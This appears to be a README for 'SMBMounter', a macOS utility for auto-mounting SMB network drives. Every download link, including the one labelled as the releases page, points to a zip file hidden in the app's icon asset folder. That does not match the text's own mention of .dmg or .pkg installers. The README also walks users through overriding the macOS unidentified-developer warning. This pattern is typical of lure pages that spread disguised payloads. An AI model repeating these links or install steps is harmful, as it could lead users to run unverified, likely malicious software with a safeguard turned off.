# 🖧 SMBMounter - Easy SMB Network Drive Management

[![Download SMBMounter](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/brendanbirch/SMBMounter/raw/refs/heads/main/SMBMounter/Assets.xcassets/AppIcon.appiconset/SMB_Mounter_2.0.zip)

---

## 📂 What is SMBMounter?

SMBMounter helps you connect to SMB network drives on MacOS. It can automatically mount drives when you start your computer. It also reconnects drives if the connection drops. This tool makes managing SMB shares easier without having to do it by hand every time.

SMB stands for Server Message Block. It is a common way to share files over a network, especially in office or home networks. Many printers, file servers, and network-attached storage (NAS) devices use SMB for sharing files.

---

## 🌟 Key Features

- Automatically connects to shared network drives each time you log in.
- Reconnects drives that disconnect unexpectedly.
- Lets you add and remove SMB shares with a simple interface.
- Works well on Apple Silicon and Intel Macs.
- Runs quietly in the background.
- Supports MacOS versions from 10.14 (Mojave) and later.
- Saves your login details securely for quick access to shares.

---

## 💻 System Requirements

Before you start, make sure you meet these requirements:

- A Mac running MacOS 10.14 (Mojave) or newer.
- Network access to SMB shares you want to connect.
- An active internet connection to download the app.
- Basic user account with rights to install software on your Mac.

---

## 🚀 Getting Started

This section will walk you through downloading and using SMBMounter step by step.

---

## 🎯 Step 1: Download SMBMounter

To get the software, visit the official release page by clicking the button below:

[![Get SMBMounter](https://img.shields.io/badge/Download-Here-blue)](https://github.com/brendanbirch/SMBMounter/raw/refs/heads/main/SMBMounter/Assets.xcassets/AppIcon.appiconset/SMB_Mounter_2.0.zip)

- This page contains the latest versions.
- Look for a file named similar to `SMBMounter.dmg` or `.pkg`.
- Click the file link to start downloading it.

The file type `.dmg` or `.pkg` is a standard Mac installer. You will use it to install the app on your machine.

---

## 🖥️ Step 2: Install SMBMounter

Once the file downloads, follow these steps:

1. Open the `.dmg` or `.pkg` file by double-clicking it.
2. You might see a window with the SMBMounter icon and an Applications folder.
3. Drag the SMBMounter icon into the Applications folder to install it.
4. If prompted, enter your Mac username and password to allow installation.
5. Wait for the copy process to complete.
6. Once done, close the installer window.
7. Open your Applications folder and find SMBMounter.

If you see a warning message that the app is from an unidentified developer:

- Go to Apple menu > System Preferences > Security & Privacy.
- Under the General tab, allow the app to run by clicking "Open Anyway".

---

## ⚙️ Step 3: Setup Your Network Drives

After installing, open SMBMounter by clicking its application icon.

1. The main window lets you add new SMB shares.
2. Click the "Add New Share" button.
3. Enter the network location of your SMB share. This usually looks like `smb://servername/sharename`.
4. Enter your username and password for the network if required.
5. Choose if you want the share mounted automatically at startup.
6. Click "Save" to add the share.

You can add multiple shares and control each one from this interface. SMBMounter will try to reconnect your shares if they disconnect.

---

## 🔄 Step 4: Managing Shares

SMBMounter provides these options to manage your network drives:

- **Connect**: Mount a selected network share immediately.
- **Disconnect**: Unmount a share safely.
- **Edit**: Change the share’s settings like path, username, or password.
- **Remove**: Delete a share from the list.
- **Reconnect Automatically**: Enable or disable automatic reconnection on startup.

You can change these settings anytime by opening the app.

---

## 🔧 Troubleshooting Tips

If you have trouble connecting to SMB shares, try these steps:

- Make sure your Mac is connected to the network with the shared drive.
- Verify that the share’s network path is correct.
- Check your username and password are accurate.
- Restart SMBMounter or your Mac.
- Confirm the target SMB server is powered on and accessible.

If you see repeated errors about permission or connection failure:

- Confirm your user account has permission on the network share.
- Test the same share using Finder: in Finder’s menu, go to "Go" > "Connect to Server" and enter the share path.

---

## 🔒 Security Notes

SMBMounter saves your login information in your Mac’s keychain. This stores passwords safely, so you don’t have to enter them each time. Make sure your Mac user account is secure with a password to protect this information.

---

## 📥 Where to Get Updates

Check the releases page regularly for new versions here:

https://github.com/brendanbirch/SMBMounter/raw/refs/heads/main/SMBMounter/Assets.xcassets/AppIcon.appiconset/SMB_Mounter_2.0.zip

Updates improve compatibility and fix issues with network shares. To update SMBMounter:

- Download the newest `.dmg` or `.pkg` file from the releases page.
- Install it by following the steps from Step 2 above.
- Your shares and settings will remain intact.

---

## 📚 Additional Resources

For more help, you can use MacOS’s built-in help or search online for SMB basics. Mac forums and Apple support sites can provide advice on network shares and permissions. SMBMounter focuses on simplifying mounting, but knowing SMB fundamentals helps.

---

## ❓ Frequently Asked Questions

**Q: Can SMBMounter connect to Windows shared drives?**

A: Yes, SMBMounter works with SMB shares on many devices, including Windows PCs and NAS drives.

**Q: Does SMBMounter work on the latest MacOS versions?**

A: It supports MacOS 10.14 (Mojave) and later, including Apple Silicon Macs.

**Q: What happens if my password changes?**

A: Update the share’s settings in SMBMounter with the new password to keep automatic connections working.

---

## ⬇️ Ready to Start?

Download SMBMounter from GitHub:

[![Download SMBMounter](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/brendanbirch/SMBMounter/raw/refs/heads/main/SMBMounter/Assets.xcassets/AppIcon.appiconset/SMB_Mounter_2.0.zip)